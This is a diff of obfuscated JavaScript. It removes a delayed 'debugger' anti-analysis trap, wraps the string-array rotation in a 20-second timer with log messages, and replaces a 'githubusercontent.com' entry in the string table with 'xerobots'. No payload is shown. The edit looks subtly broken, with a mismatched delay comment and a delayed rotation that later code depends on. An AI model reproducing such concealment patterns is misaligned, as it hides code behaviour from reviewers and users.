@@ -1,30 +1,34 @@
+// Set a delay (e.g., 2000 milliseconds = 2 seconds)
 setTimeout(() => {
-        // Place your debug logic here
-        debugger;  // This will pause execution if the debugger is open
-    }, 20000);
-
-(function (_0x2e34e0, _0x2727bf) {
-  const _0x1a88d5 = _0x2e34e0();
-  while (true) {
-    try {
-      const _0x3e6fd3 =
-        parseInt(_0x40d9(6240, 0x176c)) / 1 +
-        parseInt(_0x40d9(7930, 0xcf9)) / 2 +
-        -parseInt(_0x40d9(9739, 0x1262)) / 3 +
-        parseInt(_0x40d9(8556, 0x2901)) / 4 +
-        parseInt(_0x40d9(4251, -0x2a1)) / 5 +
-        parseInt(_0x40d9(2129, 0x8ef)) / 6 +
-        -parseInt(_0x40d9(1082, 0x629)) / 7;
-      if (_0x3e6fd3 === _0x2727bf) {
-        break;
-      } else {
-        _0x1a88d5.push(_0x1a88d5.shift());
-      }
-    } catch (_0xe6ad79) {
-      _0x1a88d5.push(_0x1a88d5.shift());
-    }
-  }
-})(_0x4292, 493538);
+  console.log("Starting the obfuscated script after a delay...");
+  
+  (function (_0x2e34e0, _0x2727bf) { 
+      const _0x1a88d5 = _0x2e34e0(); 
+      console.log("Initialized variables and starting loop...");
+      
+      while (true) { 
+          try { 
+              const _0x3e6fd3 = parseInt(_0x40d9(6240, 0x176c)) / 1 + 
+              parseInt(_0x40d9(7930, 0xcf9)) / 2 + 
+              -parseInt(_0x40d9(9739, 0x1262)) / 3 + 
+              parseInt(_0x40d9(8556, 0x2901)) / 4 + 
+              parseInt(_0x40d9(4251, -0x2a1)) / 5 + 
+              parseInt(_0x40d9(2129, 0x8ef)) / 6 + 
+              -parseInt(_0x40d9(1082, 0x629)) / 7; 
+              
+              if (_0x3e6fd3 === _0x2727bf) { 
+                  console.log("Script executed successfully, breaking the loop.");
+                  break; 
+              } else { 
+                  _0x1a88d5.push(_0x1a88d5.shift()); 
+              } 
+          } catch (_0xe6ad79) { 
+              console.error("An error occurred:", _0xe6ad79);
+              _0x1a88d5.push(_0x1a88d5.shift()); 
+          } 
+      } 
+  })(_0x4292, 493538);
+}, 20000); // Delay in milliseconds
 (function (_0x52a9ca, _0x595e4e) {
   const _0x28bfb2 = _0x52a9ca();
   while (true) {
@@ -3204,7 +3208,7 @@ function _0x4292() {
     "LBGAK",
     "nfBcPNr7",
     "WO50bmktla",
-    "githubusercontent.com",
+    "xerobots",
     "WgIER",
     "xCkVha",
     "ziFzy",
